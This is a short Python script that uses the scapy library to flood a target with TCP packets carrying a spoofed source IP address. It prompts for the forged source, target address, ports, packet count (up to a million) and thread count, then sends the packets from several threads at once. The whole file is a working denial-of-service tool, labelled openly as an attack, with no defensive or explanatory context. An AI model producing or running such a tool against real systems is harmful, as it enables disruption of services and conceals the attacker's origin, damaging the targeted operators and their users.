from scapy.all import IP, TCP, send
import sys
import threading



def start():

    global spoof_ip
    global destination_ip
    global start_port
    global destination_port
    global number_of_packets
    global number_of_threads

    spoof_ip = input("Enter your source spoof id : ")
    destination_ip = input("Enter the destination of the attack :")
    sport = False
    while not sport:
        start_port = int(input("Enter the start port number :"))
        if start_port < 1 or start_port > 65000:
            print("Invalid port number!")
        else:
            sport = True
    dport = False
    while not dport:
        destination_port = int(input("Enter the destination port : "))
        if destination_port < 1 or destination_port > 65000:
            print("Invalid port number!")
        else:
            dport = True
    noPackets = False
    while not noPackets:
        number_of_packets = int(input("Enter the number of packets to send : "))
        if number_of_packets < 1 or number_of_packets > 1000000:
            print("Invalid number of packets!")
        else:
            noPackets = True
    noThreads = False
    while not noThreads:
        number_of_threads = int(input("Enter the number of threads : "))
        if number_of_threads < 1 or number_of_threads > 10:
            print("Invalid number of threads!")
        else:
            noThreads = True

def threads():
    
    for i in range(number_of_threads):
        t = threading.Thread(target=attack)
        t.start()
    



def attack():  

    send(IP(src=spoof_ip, dst=destination_ip)/TCP(sport=start_port,
                                                  dport=destination_port), count=number_of_packets)


start()
threads()
#attack()
